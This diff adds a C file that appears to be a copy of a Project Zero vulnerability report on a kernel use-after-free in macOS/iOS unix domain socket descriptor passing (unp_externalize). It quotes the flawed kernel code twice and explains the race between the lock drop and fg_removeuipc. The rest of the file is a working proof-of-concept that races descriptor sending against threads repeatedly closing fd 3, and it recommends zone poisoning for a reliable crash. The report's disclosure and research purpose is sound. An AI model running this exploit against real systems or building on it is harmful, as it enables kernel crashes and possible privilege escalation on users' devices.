@@ -1,0 +1,313 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1123
+
+unp_externalize is responsible for externalizing the file descriptors carried within a unix domain socket message.
+That means allocating new fd table entries in the receiver and recreating a file which looks looks (to userspace) like the file
+the sender sent.
+
+Here's the relevant code:
+
+  for (i = 0; i < newfds; i++) {     <----------- (a)
+#if CONFIG_MACF_SOCKET
+    /*
+     * If receive access is denied, don't pass along
+     * and error message, just discard the descriptor.
+     */
+    if (mac_file_check_receive(kauth_cred_get(), rp[i])) {
+      proc_fdunlock(p);
+      unp_discard(rp[i], p);
+      fds[i] = 0;
+      proc_fdlock(p);
+      continue;
+    }
+#endif
+    if (fdalloc(p, 0, &f))
+      panic("unp_externalize:fdalloc");
+    fp = fileproc_alloc_init(NULL);
+    if (fp == NULL)
+      panic("unp_externalize: MALLOC_ZONE");
+    fp->f_iocount = 0;
+    fp->f_fglob = rp[i];
+    if (fg_removeuipc_mark(rp[i]))
+      fgl[i] = rp[i];
+    else
+      fgl[i] = NULL;
+    procfdtbl_releasefd(p, f, fp);
+    fds[i] = f;
+  }
+  proc_fdunlock(p);                <-------- (b)
+
+  for (i = 0; i < newfds; i++) {
+    if (fgl[i] != NULL) {
+      VERIFY(fgl[i]->fg_lflags & FG_RMMSGQ);
+      fg_removeuipc(fgl[i]);      <--------- (c)
+    }
+    if (fds[i])
+      (void) OSAddAtomic(-1, &unp_rights);
+  }
+
+
+The loop at a gets the fileglobs from the socket message buffer and allocates new fds in the receiver
+and sets the fp->f_fglob fileglob pointer to point to the sent fg. After each new fd is allocated and initialized
+the fd is released and associated with the new fp.
+
+At (b) the code then drops the process fd lock at which point other threads can access the fd table again.
+
+At (c) the code then removes each of the fileglobs from the list of in-transit fileglobs; however this list *doesn't*
+hold an fg reference therefore there's nothing stopping the fg from getting free'd via another thread closing
+the fd between (b) and (c).
+
+Use zone poisoning for a reliable crasher.
+
+tested on MacOS 10.12.3 (16D32) on MacbookAir5,2 
+*/
+
+//ianbeer
+//the ReadDescriptor and Write Descriptor functions are based on Apple sample code from: https://developer.apple.com/library/content/qa/qa1541/_index.html
+
+#if 0
+iOS/MacOS kernel uaf due to bad locking in unix domain socket file descriptor externalization
+
+unp_externalize is responsible for externalizing the file descriptors carried within a unix domain socket message.
+That means allocating new fd table entries in the receiver and recreating a file which looks looks (to userspace) like the file
+the sender sent.
+
+Here's the relevant code:
+
+	for (i = 0; i < newfds; i++) {     <----------- (a)
+#if CONFIG_MACF_SOCKET
+		/*
+		 * If receive access is denied, don't pass along
+		 * and error message, just discard the descriptor.
+		 */
+		if (mac_file_check_receive(kauth_cred_get(), rp[i])) {
+			proc_fdunlock(p);
+			unp_discard(rp[i], p);
+			fds[i] = 0;
+			proc_fdlock(p);
+			continue;
+		}
+#endif
+		if (fdalloc(p, 0, &f))
+			panic("unp_externalize:fdalloc");
+		fp = fileproc_alloc_init(NULL);
+		if (fp == NULL)
+			panic("unp_externalize: MALLOC_ZONE");
+		fp->f_iocount = 0;
+		fp->f_fglob = rp[i];
+		if (fg_removeuipc_mark(rp[i]))
+			fgl[i] = rp[i];
+		else
+			fgl[i] = NULL;
+		procfdtbl_releasefd(p, f, fp);
+		fds[i] = f;
+	}
+	proc_fdunlock(p);                <-------- (b)
+
+	for (i = 0; i < newfds; i++) {
+		if (fgl[i] != NULL) {
+			VERIFY(fgl[i]->fg_lflags & FG_RMMSGQ);
+			fg_removeuipc(fgl[i]);      <--------- (c)
+		}
+		if (fds[i])
+			(void) OSAddAtomic(-1, &unp_rights);
+	}
+
+
+The loop at a gets the fileglobs from the socket message buffer and allocates new fds in the receiver
+and sets the fp->f_fglob fileglob pointer to point to the sent fg. After each new fd is allocated and initialized
+the fd is released and associated with the new fp.
+
+At (b) the code then drops the process fd lock at which point other threads can access the fd table again.
+
+At (c) the code then removes each of the fileglobs from the list of in-transit fileglobs; however this list *doesn't*
+hold an fg reference therefore there's nothing stopping the fg from getting free'd via another thread closing
+the fd between (b) and (c).
+
+Use zone poisoning for a reliable crasher.
+
+tested on MacOS 10.12.3 (16D32) on MacbookAir5,2 
+#endif 
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/uio.h>
+#include <sys/socket.h>
+#include <errno.h>
+#include <assert.h>
+#include <pthread.h>
+
+static const char kDummyData = 'D';
+
+static int ReadDescriptor(int fd, int *fdRead)
+    // Read a descriptor from fd and place it in *fdRead.
+    //
+    // On success, the caller is responsible for closing *fdRead.
+{
+    int                 err;
+    int                 junk;
+    struct msghdr       msg;
+    struct iovec        iov;
+    struct {
+        struct cmsghdr  hdr;
+        int             fd;
+    }                   control;
+    char                dummyData;
+    ssize_t             bytesReceived;
+
+    // Pre-conditions
+
+    assert(fd >= 0);
+    assert( fdRead != NULL);
+    assert(*fdRead == -1);
+
+    // Read a single byte of data from the socket, with the assumption 
+    // that this byte has piggybacked on to it a single descriptor that 
+    // we're trying to receive. This is pretty much standard boilerplate 
+    // code for reading descriptors; see <x-man-page://2/recv> for details.
+
+    iov.iov_base = (char *) &dummyData;
+    iov.iov_len  = sizeof(dummyData);
+
+    msg.msg_name       = NULL;
+    msg.msg_namelen    = 0;
+    msg.msg_iov        = &iov;
+    msg.msg_iovlen     = 1;
+    msg.msg_control    = &control;
+    msg.msg_controllen = sizeof(control);
+    msg.msg_flags      = MSG_WAITALL;
+
+    do {
+        bytesReceived = recvmsg(fd, &msg, 0);
+        if (bytesReceived == sizeof(dummyData)) {
+            if ( (dummyData != kDummyData)
+                || (msg.msg_flags != 0) 
+                || (msg.msg_control == NULL) 
+                || (msg.msg_controllen != sizeof(control)) 
+                || (control.hdr.cmsg_len != sizeof(control)) 
+                || (control.hdr.cmsg_level != SOL_SOCKET)
+                || (control.hdr.cmsg_type  != SCM_RIGHTS) 
+                || (control.fd < 0) ) {
+                err = EINVAL;
+            } else {
+                *fdRead = control.fd;
+                err = 0;
+            }
+        } else if (bytesReceived == 0) {
+            err = EPIPE;
+        } else {
+            assert(bytesReceived == -1);
+
+            err = errno;
+            assert(err != 0);
+        }
+    } while (err == EINTR);
+
+    assert( (err == 0) == (*fdRead >= 0) );
+
+    return err;
+}
+
+static int WriteDescriptor(int fd, int fdToWrite)
+    // Write the descriptor fdToWrite to fd.
+{
+    int                 err;
+    struct msghdr       msg;
+    struct iovec        iov;
+    struct {
+        struct cmsghdr  hdr;
+        int             fd;
+    }                   control;
+    ssize_t             bytesSent;
+    char                ack;
+
+    // Pre-conditions
+
+    assert(fd >= 0);
+    assert(fdToWrite >= 0);
+
+    control.hdr.cmsg_len   = sizeof(control);
+    control.hdr.cmsg_level = SOL_SOCKET;
+    control.hdr.cmsg_type  = SCM_RIGHTS;
+    control.fd             = fdToWrite;
+
+    iov.iov_base = (char *) &kDummyData;
+    iov.iov_len  = sizeof(kDummyData);
+
+    msg.msg_name       = NULL;
+    msg.msg_namelen    = 0;
+    msg.msg_iov        = &iov;
+    msg.msg_iovlen     = 1;
+    msg.msg_control    = &control;
+    msg.msg_controllen = control.hdr.cmsg_len;
+    msg.msg_flags      = 0;
+    do {
+        bytesSent = sendmsg(fd, &msg, 0);
+        if (bytesSent == sizeof(kDummyData)) {
+            err = 0;
+        } else {
+            assert(bytesSent == -1);
+
+            err = errno;
+            assert(err != 0);
+        }
+    } while (err == EINTR);
+
+    return err;
+}
+
+char* filenames[10] = {"a", "b", "c", "d", "e", "f", "g", "h", "i", "j"};
+
+void parent(int sock) {
+  int f = 0;
+  while(1) {
+    char* filename = filenames[f];
+    f++;
+    f %= 10;
+    int to_send = open(filename, O_CREAT|O_RDWR, 0644);
+    
+    int err = WriteDescriptor(sock, to_send);
+    printf("err: %x\n", err);
+    
+    close(to_send);
+  }
+}
+
+void* child_thread(void* arg) {
+  while(1) {
+    close(3);
+  }
+}
+
+void child(int sock) {
+  for (int i = 0; i < 10; i++) {
+    pthread_t t;
+    pthread_create(&t, NULL, child_thread, NULL);
+  }
+  while (1) {
+    int received = -1;
+    int err = ReadDescriptor(sock, &received);
+    close(received);
+  }
+}
+
+int main() {
+  int socks[2];
+  socketpair(PF_LOCAL, SOCK_STREAM, 0, socks);
+
+  pid_t pid = fork();
+  if (pid != 0) {
+    close(socks[1]);
+    parent(socks[0]);
+    int wl;
+    waitpid(pid, &wl, 0);
+    exit(EXIT_SUCCESS);
+  } else {
+    close(socks[0]);
+    child(socks[1]);
+    exit(EXIT_SUCCESS);
+  }
+  return 0;
+}
